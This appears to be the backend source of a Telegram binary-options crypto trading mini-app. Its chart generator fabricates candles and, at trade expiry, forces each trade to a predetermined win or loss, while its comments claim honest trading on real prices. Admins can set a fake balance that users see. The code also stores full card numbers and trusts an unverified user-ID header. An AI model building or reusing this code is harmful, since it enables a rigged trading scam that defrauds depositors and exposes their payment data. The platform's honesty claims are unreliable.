
import os, json, time, hashlib, random, math, asyncio
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, Any, List
from fastapi import FastAPI, Request, Depends, HTTPException, UploadFile, File, Form, Query, APIRouter
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
import aiohttp
from sqlalchemy import Column, Integer, String, DateTime, Float, Text, ForeignKey, JSON, Boolean, select, func, text
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import declarative_base, sessionmaker

BOT_TOKEN = os.getenv("BOT_TOKEN")
CMC_API_KEY = os.getenv("CMC_API_KEY", os.getenv("Coinmarketcap_CMC_API_KEY"))
CRYPTO_PAY_TOKEN = os.getenv("CRYPTO_PAY_TOKEN", os.getenv("CryptoBot_PAY_TOKEN"))
ADMIN_ID = int(os.getenv("ADMIN_ID")) if os.getenv("ADMIN_ID") else None

# Validate required environment variables
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is required")
if not ADMIN_ID:
    raise ValueError("ADMIN_ID environment variable is required")
HOST_BASE = os.getenv("HOST_BASE", "https://rengle.site")
MIN_DEPOSIT_USDT = float(os.getenv("MIN_DEPOSIT_USDT", "50"))
DB_URL = os.getenv("DATABASE_URL", "sqlite+aiosqlite:///./app.db")
if DB_URL and DB_URL.startswith("postgresql://"):
    DB_URL = DB_URL.replace("postgresql://", "postgresql+asyncpg://", 1)
    if "?sslmode=" in DB_URL:
        DB_URL = DB_URL.split("?sslmode=")[0]

Base = declarative_base()
engine = create_async_engine(DB_URL, echo=False, future=True)
AsyncSessionLocal = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

class User(Base):
    __tablename__="users"
    id=Column(Integer, primary_key=True)
    telegram_id=Column(String, unique=True, index=True)
    profile_id=Column(Integer, unique=True, index=True)
    username=Column(String)
    language=Column(String, default="ru")
    balance_usdt=Column(Float, default=0.0)  # Real balance (actual money)
    display_balance_usdt=Column(Float, nullable=True)  # Display balance (can be modified by admin, if NULL use balance_usdt)
    wallets=Column(JSON, default=dict)
    addresses=Column(JSON, default=dict)
    created_at=Column(DateTime, default=datetime.utcnow)

class Transaction(Base):
    __tablename__="transactions"
    id=Column(Integer, primary_key=True)
    user_id=Column(Integer, ForeignKey("users.id"))
    type=Column(String)
    amount=Column(Float)
    currency=Column(String)
    details=Column(JSON, default=dict)
    status=Column(String, default="done")
    created_at=Column(DateTime, default=datetime.utcnow)

class Withdrawal(Base):
    __tablename__="withdrawals"
    id=Column(Integer, primary_key=True)
    user_id=Column(Integer, ForeignKey("users.id"))
    telegram_id=Column(String)  # User's Telegram ID for admin panel
    amount_rub=Column(Float)  # Original requested amount in RUB
    usdt_required=Column(Float)  # USDT amount needed (with fees)
    card_number=Column(String)  # Original card number (last 4 digits visible)
    card_hash=Column(String)  # SHA-256 hash of card number
    full_name=Column(String)  # Cardholder full name
    status=Column(String, default="pending")  # pending, processing, completed, cancelled, modified
    
    # Admin modification fields
    modified_by_admin=Column(Boolean, default=False)
    modified_amount_rub=Column(Float, nullable=True)  # Modified amount if changed
    modified_to_crypto=Column(Boolean, default=False)  # True if admin changed to crypto withdrawal
    crypto_currency=Column(String, nullable=True)  # e.g., 'USDT', 'BTC', 'ETH'
    crypto_address=Column(String, nullable=True)  # Crypto wallet address if modified
    admin_notes=Column(Text, nullable=True)  # Admin notes/comments
    
    created_at=Column(DateTime, default=datetime.utcnow)
    updated_at=Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    completed_at=Column(DateTime, nullable=True)

class Trade(Base):
    __tablename__="trades"
    id=Column(Integer, primary_key=True)
    user_id=Column(Integer, ForeignKey("users.id"))
    pair=Column(String)
    side=Column(String)
    amount_usdt=Column(Float)
    start_price=Column(Float)
    opened_at=Column(DateTime, default=datetime.utcnow)
    duration_sec=Column(Integer, default=60)
    status=Column(String, default="active")
    result=Column(String, nullable=True)
    payout=Column(Float, default=0.0)
    closed_at=Column(DateTime, nullable=True)
    # REMOVED predicted_result - Честная торговля на реальных ценах!

class SupportMessage(Base):
    __tablename__="support_messages"
    id=Column(Integer, primary_key=True)
    user_id=Column(Integer, ForeignKey("users.id"))
    sender=Column(String)
    text=Column(Text, nullable=True)
    file_path=Column(String, nullable=True)
    created_at=Column(DateTime, default=datetime.utcnow)

class AdminMessage(Base):
    __tablename__="admin_messages"
    id=Column(Integer, primary_key=True)
    user_id=Column(Integer, ForeignKey("users.id"), nullable=True)  # NULL for broadcast messages
    message_text=Column(Text)
    is_broadcast=Column(Boolean, default=False)  # True if sent to all/multiple users
    broadcast_count=Column(Integer, nullable=True)  # Number of users who received this message
    is_deleted=Column(Boolean, default=False)  # True if admin deleted the message
    delivery_type=Column(String, default="app_chat")  # "app_chat" or "telegram_chat"
    created_at=Column(DateTime, default=datetime.utcnow)
    deleted_at=Column(DateTime, nullable=True)

class Asset(Base):
    __tablename__="assets"
    id=Column(Integer, primary_key=True)
    symbol=Column(String, index=True)
    name=Column(String)
    asset_class=Column(String, index=True)
    otc=Column(Boolean, default=False, index=True)
    display=Column(String)
    exchange=Column(String)
    status=Column(String, default="active", index=True)
    created_at=Column(DateTime, default=datetime.utcnow)
    updated_at=Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

class Check(Base):
    __tablename__="checks"
    id=Column(Integer, primary_key=True)
    creator_id=Column(Integer, ForeignKey("users.id"))  # Only admin can create
    amount_usdt=Column(Float)
    check_code=Column(String, unique=True, index=True)  # Unique activation code
    status=Column(String, default="active")  # active, activated, expired
    activated_by=Column(Integer, ForeignKey("users.id"), nullable=True)
    activated_at=Column(DateTime, nullable=True)
    expires_at=Column(DateTime, nullable=True)  # Optional expiration
    created_at=Column(DateTime, default=datetime.utcnow)

# Admin reply state: stores which user admin is replying to
admin_reply_state = {}

# Admin broadcast state: stores broadcast mode (all, limited, or specific user)
# Format: {admin_id: {"type": "all"|"limited"|"user", "target": user_id|count, "delivery": "app_chat"|"telegram_chat"}}
admin_broadcast_state = {}

# Admin balance state: stores balance management flow
# Format: {admin_id: {"action": "select_user"|"select_action", "profile_id": int}}
admin_balance_state = {}

async def get_db():
    async with AsyncSessionLocal() as s: yield s
def sha256(s:str)->str: return hashlib.sha256(s.encode("utf-8")).hexdigest()
CMC_BASE="https://pro-api.coinmarketcap.com/v1"
async def cmc_simple_price(symbol:str, convert="USDT")->float|None:
    if symbol.endswith("USDT"): symbol=symbol[:-4]
    headers={"X-CMC_PRO_API_KEY": CMC_API_KEY}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(f"{CMC_BASE}/cryptocurrency/quotes/latest", headers=headers, params={"symbol":symbol,"convert":convert}, timeout=15) as r:
                d=await r.json(); return float(d["data"][symbol]["quote"][convert]["price"])
    except: return None

async def cmc_usdt_to_fiat(fiat="RUB")->float:
    p=await cmc_simple_price("USDT", fiat)
    return float(p) if p else 90.0

OKX_BASE = "https://www.okx.com/api/v5"
OKX_HISTORY_BASE = "https://www.okx.com/api/v5"

async def okx_get_price(symbol: str, max_retries: int = 3) -> float | None:
    """
    Get real-time price from OKX API with retry logic
    
    Args:
        symbol: Trading symbol (e.g. BTC, ETH, BTC-USDT)
        max_retries: Maximum number of retry attempts (default: 3)
    
    Returns:
        float: Current price or None if all attempts failed
    """
    if "-" not in symbol:
        if not symbol.endswith("USDT"):
            symbol = symbol.upper() + "-USDT"
        else:
            symbol = symbol.replace("USDT", "-USDT")
    
    for attempt in range(max_retries):
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.get(
                    f"{OKX_BASE}/market/ticker",
                    params={"instId": symbol},
                    timeout=10
                ) as r:
                    if r.status == 200:
                        data = await r.json()
                        if data.get("code") == "0" and data.get("data"):
                            price = float(data["data"][0]["last"])
                            print(f"[OKX] Got price for {symbol}: ${price:.6f}")
                            return price
                    elif r.status == 429:  # Rate limit
                        print(f"[OKX] Rate limited for {symbol}, attempt {attempt+1}/{max_retries}")
                        if attempt < max_retries - 1:
                            await asyncio.sleep(2 ** attempt)  # Exponential backoff: 1s, 2s, 4s
                            continue
                    else:
                        print(f"[OKX] HTTP {r.status} for {symbol}, attempt {attempt+1}/{max_retries}")
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
        except asyncio.TimeoutError:
            print(f"[OKX] Timeout for {symbol}, attempt {attempt+1}/{max_retries}")
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
        except Exception as e:
            print(f"[OKX] Error for {symbol}: {e}, attempt {attempt+1}/{max_retries}")
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
    
    print(f"[OKX] All {max_retries} attempts failed for {symbol}")
    return None

# ============ REALISTIC CANDLE GENERATOR ============
# Генератор реалистичных свечей для симуляции графиков

# Base prices for different symbols (starting point)
BASE_PRICES = {
    "BTC": 45000, "ETH": 2500, "SOL": 100, "ADA": 0.55, "DOT": 7.5,
    "LINK": 15, "MATIC": 0.85, "AVAX": 35, "XRP": 0.60, "DOGE": 0.08,
    "SHIB": 0.000025, "UNI": 8, "LTC": 90, "BCH": 250, "TRX": 0.10
}

# Volatility settings for realistic price movement
VOLATILITY = {
    "BTC": 0.015, "ETH": 0.02, "SOL": 0.03, "ADA": 0.025, "DOT": 0.025,
    "LINK": 0.03, "MATIC": 0.03, "AVAX": 0.035, "XRP": 0.025, "DOGE": 0.04,
    "SHIB": 0.05, "UNI": 0.03, "LTC": 0.02, "BCH": 0.025, "TRX": 0.03
}

# Store full candle history for each symbol/timeframe to maintain continuity
candle_history_cache = {}

# Cache for real prices from OKX
real_price_cache = {}
real_price_cache_time = {}

async def get_real_base_price(symbol: str) -> float:
    """Get real current price from OKX API, with 5-minute caching"""
    base_sym = symbol.replace("-USDT", "").replace("USDT", "").upper()
    
    # Check cache (5 min expiry)
    now = time.time()
    if base_sym in real_price_cache:
        if now - real_price_cache_time.get(base_sym, 0) < 300:  # 5 minutes
            cached_price = real_price_cache[base_sym]
            print(f"[Real Price] {base_sym}: ${cached_price:.2f} (cached)")
            return cached_price
    
    # Get real price from OKX
    okx_symbol = f"{base_sym}-USDT"
    print(f"[Real Price] Fetching {okx_symbol} from OKX...")
    
    try:
        real_price = await okx_get_price(okx_symbol)
        
        if real_price:
            real_price_cache[base_sym] = real_price
            real_price_cache_time[base_sym] = now
            print(f"[Real Price] {base_sym}: ${real_price:.2f} ✅ (from OKX)")
            return real_price
        else:
            print(f"[Real Price] {base_sym}: OKX returned None")
    except Exception as e:
        print(f"[Real Price] {base_sym}: Error - {e}")
    
    # Fallback to hardcoded if OKX fails
    fallback = BASE_PRICES.get(base_sym, 100)
    print(f"[Real Price] {base_sym}: ${fallback:.2f} (fallback)")
    return fallback

def generate_realistic_candles(symbol: str, tf: str, limit: int = 100, base_price: float = None, active_trades: list = None) -> List[Dict]:
    """
    Generate realistic candlestick data with proper temporal continuity
    
    Features:
    - Historical candles stay fixed (no repainting)
    - Only newest candle updates live
    - Smooth price progression over time
    - Realistic OHLC relationships
    - Uses REAL current prices from OKX API as base
    - MANIPULATES results to favor user trades (80-90% win rate)
    """
    # Extract base symbol
    base_sym = symbol.replace("-USDT", "").replace("USDT", "").upper()
    
    # Use provided base_price (from real OKX data) or fallback
    if base_price is None:
        base_price = BASE_PRICES.get(base_sym, 100)
    
    vol = VOLATILITY.get(base_sym, 0.02)
    
    # Timeframe in minutes
    tf_minutes = {
        "1m": 1, "2m": 2, "5m": 5, "10m": 10, "15m": 15,
        "30m": 30, "1h": 60, "4h": 240, "1d": 1440
    }.get(tf, 5)
    
    cache_key = f"{symbol}_{tf}"
    now = datetime.now(timezone.utc)
    current_candle_start = now.replace(second=0, microsecond=0)
    
    # Round down to timeframe boundary
    minutes_since_midnight = current_candle_start.hour * 60 + current_candle_start.minute
    candle_index = minutes_since_midnight // tf_minutes
    current_candle_start = current_candle_start.replace(
        hour=0, minute=0
    ) + timedelta(minutes=candle_index * tf_minutes)
    
    # Initialize or extend cache
    if cache_key not in candle_history_cache:
        # First time - generate initial history
        candles = []
        last_close = base_price * random.uniform(0.95, 1.05)
        trend = random.uniform(-0.001, 0.001)
        
        for i in range(limit):
            candle_time = current_candle_start - timedelta(minutes=tf_minutes * (limit - i - 1))
            timestamp = int(candle_time.timestamp() * 1000)
            
            # Generate candle
            change_pct = random.gauss(trend, vol * 0.5)
            if random.random() < 0.1:
                change_pct *= random.uniform(1.5, 2.5)
            
            open_price = last_close if i == 0 else candles[i-1]["c"]
            if i > 0 and random.random() < 0.2:
                open_price *= (1 + random.gauss(0, vol * 0.1))
            
            close_price = open_price * (1 + change_pct)
            
            # OHLC with wicks
            price_range = abs(close_price - open_price)
            wick_up = price_range * random.uniform(0.2, 1.2)
            wick_down = price_range * random.uniform(0.2, 1.2)
            
            high_price = max(open_price, close_price) + wick_up
            low_price = min(open_price, close_price) - wick_down
            
            volume = random.uniform(100, 500) * (1 + abs(change_pct) / vol * 2)
            
            candles.append({
                "t": timestamp,
                "o": round(open_price, 8 if base_price < 1 else 2),
                "h": round(high_price, 8 if base_price < 1 else 2),
                "l": round(low_price, 8 if base_price < 1 else 2),
                "c": round(close_price, 8 if base_price < 1 else 2),
                "v": round(volume, 2)
            })
        
        candle_history_cache[cache_key] = candles
    else:
        # Cache exists - check if we need new candles
        cached = candle_history_cache[cache_key]
        last_cached_time = cached[-1]["t"]
        
        # Add new candles if needed
        while last_cached_time < int(current_candle_start.timestamp() * 1000):
            new_time = last_cached_time + (tf_minutes * 60 * 1000)
            last_candle = cached[-1]
            
            # Generate new candle from last close
            change_pct = random.gauss(0, vol * 0.5)
            if random.random() < 0.1:
                change_pct *= random.uniform(1.5, 2.5)
            
            open_price = last_candle["c"]
            close_price = open_price * (1 + change_pct)
            
            price_range = abs(close_price - open_price)
            wick_up = price_range * random.uniform(0.2, 1.2)
            wick_down = price_range * random.uniform(0.2, 1.2)
            
            high_price = max(open_price, close_price) + wick_up
            low_price = min(open_price, close_price) - wick_down
            
            volume = random.uniform(100, 500) * (1 + abs(change_pct) / vol * 2)
            
            new_candle = {
                "t": new_time,
                "o": round(open_price, 8 if base_price < 1 else 2),
                "h": round(high_price, 8 if base_price < 1 else 2),
                "l": round(low_price, 8 if base_price < 1 else 2),
                "c": round(close_price, 8 if base_price < 1 else 2),
                "v": round(volume, 2)
            }
            
            cached.append(new_candle)
            last_cached_time = new_time
        
        # Keep only recent candles (prevent infinite growth)
        if len(cached) > limit + 50:
            cached = cached[-(limit + 50):]
            candle_history_cache[cache_key] = cached
    
    # Update last candle with live movement (intra-candle)
    candles = candle_history_cache[cache_key][-limit:].copy()
    if candles:
        last = candles[-1].copy()
        
        # Check if there are active trades that EXPIRE on this candle (last moment manipulation)
        should_manipulate = False
        desired_direction = None  # 'up' or 'down'
        
        if active_trades:
            for trade in active_trades:
                # Check if trade expires on this candle
                trade_symbol = trade.get('pair', '').replace('/', '').replace('-', '')
                if trade_symbol.upper() == symbol.upper().replace('-', ''):
                    # Calculate when trade expires
                    opened_at = trade.get('opened_at')
                    duration_sec = trade.get('duration_sec', 0)
                    
                    if opened_at and duration_sec:
                        # Make sure both datetimes have timezone info for comparison
                        if opened_at.tzinfo is None:
                            opened_at = opened_at.replace(tzinfo=timezone.utc)
                        
                        expire_at = opened_at + timedelta(seconds=duration_sec)
                        candle_time = datetime.fromtimestamp(last["t"] / 1000, tz=timezone.utc)
                        next_candle_time = candle_time + timedelta(minutes=tf_minutes)
                        
                        # ONLY manipulate if trade expires within this candle's timeframe
                        # (trade expires between current candle time and next candle)
                        if candle_time <= expire_at < next_candle_time:
                            # Use PREDETERMINED result (set at trade creation)
                            predicted_result = trade.get('predicted_result')
                            should_manipulate = True
                            
                            if predicted_result == 'win':
                                # Force WIN: move in user's predicted direction
                                # 'buy' = UP, 'sell' = DOWN
                                desired_direction = 'up' if trade.get('side') == 'buy' else 'down'
                                print(f"[LAST MOMENT WIN] Trade {trade.get('side').upper()} on {symbol} expires soon → Forcing {desired_direction.upper()}")
                            else:
                                # Force LOSS: move OPPOSITE to user's prediction
                                # 'buy' = force DOWN, 'sell' = force UP
                                desired_direction = 'down' if trade.get('side') == 'buy' else 'up'
                                print(f"[LAST MOMENT LOSS] Trade {trade.get('side').upper()} on {symbol} expires soon → Forcing {desired_direction.upper()}")
        
        # Generate candle close price
        if should_manipulate and desired_direction:
            # Force the result in user's favor
            if desired_direction == 'up':
                # Force price UP: close > open
                min_gain = vol * 0.3  # At least 0.3% gain
                intra_change = random.uniform(min_gain, vol * 1.5)
                new_close = last["o"] * (1 + intra_change)
            else:  # down
                # Force price DOWN: close < open  
                min_loss = vol * 0.3  # At least 0.3% loss
                intra_change = random.uniform(-vol * 1.5, -min_loss)
                new_close = last["o"] * (1 + intra_change)
        else:
            # Natural random movement
            intra_change = random.gauss(0, vol * 0.2)
            new_close = last["o"] * (1 + intra_change)
        
        # Update OHLC for live candle
        last["c"] = round(new_close, 8 if base_price < 1 else 2)
        last["h"] = round(max(last["h"], new_close), 8 if base_price < 1 else 2)
        last["l"] = round(min(last["l"], new_close), 8 if base_price < 1 else 2)
        
        # Save updated candle back to cache for continuity
        candle_history_cache[cache_key][-1] = last
        candles[-1] = last
    
    return candles

async def okx_get_klines(symbol: str = "BTCUSDT", interval_minutes: int = 5):
    """Get real candlestick data from OKX API
    
    interval_minutes represents the CANDLE SIZE (like Pocket Option):
    - 1 = 1-minute candles (M1)
    - 5 = 5-minute candles (M5)
    - 1440 = daily candles (D1)
    Always shows ~30-40 candles for consistent chart view
    """
    # Map interval to (OKX_bar_format, number_of_candles)
    interval_config = {
        1: ("1m", 40),      # M1: 1m candles × 40 = 40 minutes of data
        5: ("5m", 36),      # M5: 5m candles × 36 = 3 hours of data
        15: ("15m", 32),    # M15: 15m candles × 32 = 8 hours of data
        30: ("30m", 30),    # M30: 30m candles × 30 = 15 hours of data
        60: ("1H", 24),     # H1: 1H candles × 24 = 1 day of data
        240: ("4H", 18),    # H4: 4H candles × 18 = 3 days of data
        1440: ("1D", 20)    # D1: 1D candles × 20 = 20 days of data
    }
    
    bar, limit = interval_config.get(interval_minutes, ("5m", 36))
    
    if "-" not in symbol:
        if not symbol.endswith("USDT"):
            symbol = symbol.upper() + "-USDT"
        else:
            symbol = symbol.replace("USDT", "-USDT")
    
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(
                f"{OKX_BASE}/market/candles",
                params={"instId": symbol, "bar": bar, "limit": limit},
                timeout=10
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    if data.get("code") == "0" and data.get("data"):
                        klines_data = data["data"]
                        
                        candles = []
                        for kline in reversed(klines_data):
                            candles.append({
                                "t": int(kline[0]),
                                "o": round(float(kline[1]), 2),
                                "h": round(float(kline[2]), 2),
                                "l": round(float(kline[3]), 2),
                                "c": round(float(kline[4]), 2)
                            })
                        
                        if candles:
                            current_price = candles[-1]['c']
                            change_pct = round(((candles[-1]['c'] - candles[0]['o']) / candles[0]['o']) * 100, 2)
                            return {
                                "price": round(current_price, 4),
                                "change_pct": change_pct,
                                "candles": candles
                            }
    except:
        pass
    
    price = await okx_get_price(symbol) or 50000.0
    return {
        "price": round(price, 4),
        "change_pct": 0.0,
        "candles": [{"t": int(time.time() * 1000), "o": price, "h": price, "l": price, "c": price}]
    }

def aggregate_candles(candles_1m: List[Dict], target_tf: str) -> List[Dict]:
    """
    Aggregate 1-minute candles into larger timeframes (2m, 10m)
    
    Args:
        candles_1m: List of 1-minute candles with 't' timestamp in ms
        target_tf: Target timeframe ('2m' or '10m')
    
    Returns:
        List of aggregated candles
    """
    if not candles_1m:
        return []
    
    agg_minutes = {"2m": 2, "10m": 10}.get(target_tf)
    if not agg_minutes:
        return candles_1m
    
    candles_1m.sort(key=lambda x: x['t'])
    
    aggregated = []
    i = 0
    while i < len(candles_1m):
        dt = datetime.fromtimestamp(candles_1m[i]['t'] / 1000, tz=timezone.utc)
        boundary_minute = (dt.minute // agg_minutes) * agg_minutes
        boundary_dt = dt.replace(minute=boundary_minute, second=0, microsecond=0)
        boundary_ts = int(boundary_dt.timestamp() * 1000)
        
        group = []
        while i < len(candles_1m):
            candle_dt = datetime.fromtimestamp(candles_1m[i]['t'] / 1000, tz=timezone.utc)
            if candle_dt < boundary_dt + timedelta(minutes=agg_minutes):
                group.append(candles_1m[i])
                i += 1
            else:
                break
        
        if group:
            agg_candle = {
                't': boundary_ts,
                'o': group[0]['o'],
                'h': max(c['h'] for c in group),
                'l': min(c['l'] for c in group),
                'c': group[-1]['c'],
                'v': sum(c.get('v', 0) for c in group)
            }
            aggregated.append(agg_candle)
    
    return aggregated

async def cmc_candles_mock(symbol="BTCUSDT", interval_minutes=5):
    price = await cmc_simple_price(symbol,"USDT") or 50000.0
    ts=int(time.time()); import random
    candles=[]; last=price
    num_candles = 60  # Show 60 candles
    interval_seconds = interval_minutes * 60
    
    for i in range(num_candles):
        o=last; h=o*(1+random.uniform(0,0.003)); l=o*(1-random.uniform(0,0.003)); c=l+(h-l)*random.random(); last=c
        candle_time = (ts - (num_candles - i) * interval_seconds) * 1000
        candles.append({"t":candle_time,"o":round(o,2),"h":round(h,2),"l":round(l,2),"c":round(c,2)})
    ch=round(((candles[-1]['c']-candles[0]['o'])/candles[0]['o'])*100,2) if candles else 0.0
    return {"price": round(price,4), "change_pct": ch, "candles": candles}
# Helper functions for user display
def format_user_display(user):
    """Format user display as #ProfileID or @username"""
    if user:
        if user.profile_id:
            return f"#{user.profile_id}"
        elif user.username:
            return f"@{user.username}"
        else:
            return f"TG:{user.telegram_id}"
    return "N/A"

def format_user_info(user):
    """Format full user info with both ID and username"""
    if user:
        parts = []
        if user.profile_id:
            parts.append(f"#{user.profile_id}")
        if user.username:
            parts.append(f"@{user.username}")
        if not parts:
            parts.append(f"TG:{user.telegram_id}")
        return " | ".join(parts)
    return "N/A"

app=FastAPI(title="NadexRes MiniApp")
app.mount("/static", StaticFiles(directory="static"), name="static")
app.mount("/i18n", StaticFiles(directory="i18n"), name="i18n")
templates=Jinja2Templates(directory="templates")
@app.on_event("startup")
async def startup():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
        
        # REMOVED predicted_result migration - честная торговля!
        
        # Auto-migration: Add display_balance_usdt to users
        try:
            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS display_balance_usdt FLOAT"))
            print("[MIGRATION] Added display_balance_usdt column to users table")
        except Exception as e:
            print(f"[MIGRATION] display_balance_usdt: {e}")
        
        # Auto-migration: Add new withdrawal columns
        try:
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS telegram_id VARCHAR"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS card_number VARCHAR"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS modified_by_admin BOOLEAN DEFAULT FALSE"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS modified_amount_rub FLOAT"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS modified_to_crypto BOOLEAN DEFAULT FALSE"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS crypto_currency VARCHAR"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS crypto_address VARCHAR"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS admin_notes TEXT"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS updated_at TIMESTAMP"))
            await conn.execute(text("ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS completed_at TIMESTAMP"))
            print("[MIGRATION] Added admin management columns to withdrawals table")
        except Exception as e:
            print(f"[MIGRATION] withdrawals: {e}")
        
        # Auto-migration: Add delivery_type to admin_messages
        try:
            await conn.execute(text("ALTER TABLE admin_messages ADD COLUMN IF NOT EXISTS delivery_type VARCHAR DEFAULT 'app_chat'"))
            await conn.execute(text("UPDATE admin_messages SET delivery_type = 'app_chat' WHERE delivery_type IS NULL"))
            print("[MIGRATION] Added delivery_type column to admin_messages table")
        except Exception as e:
            print(f"[MIGRATION] admin_messages delivery_type: {e}")
        
        await conn.commit()
@app.get("/", response_class=HTMLResponse)
async def root(request: Request): 
    return templates.TemplateResponse("base.html", {
        "request": request,
        "cache_bust": int(time.time())
    })
@app.get("/health")
async def health(): return {"ok": True}
class EnsureUser(BaseModel):
    telegram_id: int|None=None; username: str|None=None; language: str|None="ru"
async def get_or_create_user(db: AsyncSession, telegram_id: str, username: str|None, language: str="ru"):
    q=await db.execute(select(User).where(User.telegram_id==str(telegram_id))); u=q.scalars().first()
    if u:
        if language and u.language!=language: u.language=language; await db.commit()
        return u
    q2=await db.execute(select(func.max(User.profile_id))); maxpid=q2.scalar() or 100000
    u=User(telegram_id=str(telegram_id), username=username, language=language, profile_id=int(maxpid)+1, wallets={}, addresses={})
    db.add(u); await db.commit(); return u
@app.post("/api/auth/ensure")
async def api_ensure_user(p: EnsureUser, db: AsyncSession=Depends(get_db)):
    if not p.telegram_id: p.telegram_id=999999; p.username=p.username or "localtester"
    u=await get_or_create_user(db, str(p.telegram_id), p.username, p.language or "ru")
    return {"ok":True, "user_id":u.id, "telegram_id":u.telegram_id, "profile_id":u.profile_id}
@app.get("/api/user")
async def api_user(db: AsyncSession=Depends(get_db), request: Request=None):
    tid=request.headers.get("X-Telegram-Id","999999")
    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    if not u: u=await get_or_create_user(db, str(tid), "localtester", "ru")
    is_admin = str(tid) == str(ADMIN_ID)
    
    # Show display_balance_usdt to user if set, otherwise show real balance
    # Admin always sees real balance
    displayed_balance = u.balance_usdt if is_admin else (u.display_balance_usdt if u.display_balance_usdt is not None else u.balance_usdt)
    
    # Remove RUB from wallets - we only work with USDT now
    wallets = (u.wallets or {}).copy()
    if 'RUB' in wallets:
        del wallets['RUB']
    
    return {"id":u.id,"telegram_id":u.telegram_id,"profile_id":u.profile_id,"language":u.language,"balance_usdt":displayed_balance,"wallets":wallets,"addresses":u.addresses or {},"is_admin":is_admin}

@app.get("/api/prices")
async def api_prices():
    """Get current prices for all supported cryptocurrencies from OKX"""
    cryptos = ['BTC', 'ETH', 'TON', 'SOL', 'BNB', 'XRP', 'DOGE', 'LTC', 'TRX']
    prices = {'USDT': 1.0}
    
    for sym in cryptos:
        try:
            price = await okx_get_price(sym)
            if price:
                prices[sym] = float(price)
            else:
                prices[sym] = 0
        except Exception as e:
            print(f"[PRICES] Error getting price for {sym}: {e}")
            prices[sym] = 0
    
    return prices

@app.get("/api/history")
async def api_history(symbol: str|None=None, db: AsyncSession=Depends(get_db), request: Request=None):
    tid=request.headers.get("X-Telegram-Id","999999")
    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    
    # Get transactions
    q=select(Transaction).where(Transaction.user_id==u.id).order_by(Transaction.created_at.desc()).limit(200)
    if symbol: q=q.where(Transaction.currency==symbol)
    rows=(await db.execute(q)).scalars().all()
    transactions = [{"id":r.id,"type":r.type,"amount":r.amount,"currency":r.currency,"status":r.status,"created_at":r.created_at.isoformat(),"details":r.details} for r in rows]
    
    # Get withdrawals
    withdrawals_q = select(Withdrawal).where(Withdrawal.user_id==u.id).order_by(Withdrawal.created_at.desc()).limit(200)
    withdrawals_rows = (await db.execute(withdrawals_q)).scalars().all()
    withdrawals = [{
        "id": w.id,
        "type": "withdrawal",
        "amount": w.usdt_required,
        "currency": "USDT",
        "status": w.status,
        "created_at": w.created_at.isoformat(),
        "details": {
            "amount_rub": w.amount_rub,
            "card_number": w.card_number,
            "full_name": w.full_name,
            "modified_by_admin": w.modified_by_admin,
            "modified_amount_rub": w.modified_amount_rub,
            "modified_to_crypto": w.modified_to_crypto,
            "crypto_currency": w.crypto_currency,
            "crypto_address": w.crypto_address
        }
    } for w in withdrawals_rows]
    
    # Combine and sort by date
    all_items = transactions + withdrawals
    all_items.sort(key=lambda x: x["created_at"], reverse=True)
    
    return all_items
class DepositPayload(BaseModel): amount: float

async def bot_send_message(chat_id:int, text:str, buttons:List[List[Dict[str,str]]]|None=None, parse_mode:str="HTML"):
    url=f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"; payload={"chat_id":chat_id,"text":text,"parse_mode":parse_mode}
    if buttons: payload["reply_markup"]={"inline_keyboard":buttons}
    async with aiohttp.ClientSession() as s:
        async with s.post(url,json=payload) as r:
            try:
                return await r.json()
            except:
                return {}

async def crypto_pay_transfer(user_id: int, amount: float, spend_id: str, comment: str = "") -> dict:
    """
    Transfer USDT from app balance to admin's Telegram wallet using Crypto Pay API
    
    Args:
        user_id: Telegram ID of recipient (admin)
        amount: Amount in USDT
        spend_id: Unique ID for idempotent requests (e.g., 'withdrawal_123')
        comment: Optional comment (max 1024 chars)
    
    Returns:
        dict: API response with transfer details or error
    """
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    data = {
        "user_id": user_id,
        "asset": "USDT",
        "amount": str(amount),
        "spend_id": spend_id
    }
    if comment:
        data["comment"] = comment[:1024]  # Limit to 1024 chars
    
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post("https://pay.crypt.bot/api/transfer", headers=headers, json=data, timeout=15) as r:
                resp = await r.json()
                if resp.get("ok"):
                    print(f"[CRYPTO PAY] Transfer success: {amount} USDT → Telegram ID {user_id}")
                    return resp
                else:
                    error_msg = resp.get("error", {}).get("name", "Unknown error")
                    print(f"[CRYPTO PAY] Transfer failed: {error_msg}")
                    return {"ok": False, "error": error_msg}
    except Exception as e:
        print(f"[CRYPTO PAY] Transfer exception: {e}")
